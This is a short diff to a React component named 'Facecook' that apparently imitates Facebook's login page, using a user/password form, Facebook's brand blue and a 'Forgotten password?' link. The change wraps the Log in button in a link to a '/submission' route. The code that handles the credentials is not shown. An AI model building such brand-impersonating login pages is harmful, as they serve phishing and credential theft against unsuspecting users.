@@ -1,5 +1,6 @@
 import React from "react";
 import axios from "axios";
+import { Link } from "react-router-dom";
 
 const Facecook = () => {
   const [formData, setFormData] = React.useState({ user: "", pass: "" });
@@ -48,13 +49,15 @@ const Facecook = () => {
             placeholder="Password"
             required
           />
-          <button
-            type="submit"
-            cursor-pointer
-            className="bg-[#1877f2] py-3 rounded-md font-bold w-[100%] text-white text-[17px] px-[16px]"
-          >
-            Log in
-          </button>
+          <Link to="/submission">
+            <button
+              type="submit"
+              cursor-pointer
+              className="bg-[#1877f2] py-3 rounded-md font-bold w-[80vw] text-white text-[17px] px-[16px]"
+            >
+              Log in
+            </button>
+          </Link>
 
           <p className="cursor-pointer text-[#1877f2] text-[14px] font-medium ">
             Forgotten password?
